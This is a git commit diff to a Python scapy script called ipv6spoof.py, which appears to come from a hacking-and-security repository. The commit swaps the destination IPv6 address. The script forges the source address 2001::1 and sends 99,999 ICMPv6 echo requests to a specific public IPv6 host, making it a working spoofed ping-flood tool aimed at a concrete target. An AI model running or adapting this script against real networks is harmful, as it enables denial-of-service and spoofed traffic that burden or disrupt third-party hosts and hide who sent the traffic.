1ae82463bd65287f5c4ab17acaf77b0274df1d2f
hackingyseguridad <hackingyseguridad@hackingyseguridad.com>
2018-01-24 20:43:32 +0100

    Update ipv6spoof.py

--- ipv6spoof.py
+++ ipv6spoof.py
@@ -6,5 +6,5 @@
 import sys
 from scapy.all import *
 
-ipv6 = IPv6(src="2001::1", dst="2a02:9140:3c00:9200:34b3:2576:405e:34ed")/ICMPv6EchoRequest()
+ipv6 = IPv6(src="2001::1", dst="2a02:9140:3c00:9200:20a7:3f07:d4a4:4096")/ICMPv6EchoRequest()
 send(ipv6,iface="eth0", count=99999)
